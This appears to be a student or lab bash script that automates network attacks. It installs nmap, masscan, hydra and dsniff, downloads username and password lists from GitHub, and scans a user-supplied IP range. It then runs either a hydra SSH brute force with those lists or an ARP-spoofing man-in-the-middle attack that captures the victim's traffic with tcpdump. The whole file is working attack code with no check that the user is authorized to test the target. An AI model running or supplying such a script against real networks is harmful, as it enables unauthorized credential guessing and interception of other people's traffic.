#!/bin/bash

function inst()
{
#install relevant applications on the local computer
#using github to download file to local computer
sudo apt-get install nmap
sudo apt-get install masscan
sudo apt-get install hydra
sudo apt-get install dsniff
wget https://raw.githubusercontent.com/GTJKC/github-upload/master/one-username.txt
wget https://raw.githubusercontent.com/GTJKC/github-upload/master/one-password.txt
}

function chkme()
{
#Allow the user to select different scans and attacks
#Get from the user an IP range to scan (read)
echo "Enter an IP or IP range (x.x.x.x/x) to scan: "
read IP

#Get from the user a port to scan
echo "Enter the port to scan: "
read PORT

#Get from the user the service and port to attack (read) + (nmap/masscan)
#	-p print:
read -p "Please choose how to scan your network: [nmap/masscan] " SCAN

case "$SCAN" in
	"nmap") nmap $IP -p $PORT -Pn -oG SOCScan >> scanresult
	;;
	"masscan") sudo masscan --port $PORT $IP --rate=10000 >> scanresult2
	;;
esac

#Get from the user the Brute Force method to attack (read) + (hydra/MITM)
#transfering file into a new machine via github
#logging the MITM attack via tcpdump
read -p "Please choose how to attack your network: [hydra/MITM] " ATTACK

case "$ATTACK" in
	"hydra") hydra -L one-username.txt -P one-password.txt $IP ssh -t 4 >> SOCA1
	;;
	"MITM") sudo timeout 60 arpspoof -i eth0 -t $IP 10.0.0.1 2>&1 | tee -a SOCA2 & sudo timeout 60 tcpdump -i eth0 -s 1500 -X host $IP | tee -a SOCA2
sleep 5
esac

}
function log()
{
#use this function to save results such as date, time, IPs and kind of attack
read -p "Please choose which scan file to open: [nmap/masscan] " SCAN

case "$SCAN" in
	"nmap") cat scanresult
	;;
	"masscan") cat scanresult2
esac

read -p "Please choose which attack file to open: [hydra/MITM] " ATTACK

case "$ATTACK" in
	"hydra") cat SOCA1
	;;
	"MITM") cat SOCA2
esac
}

inst
chkme
log
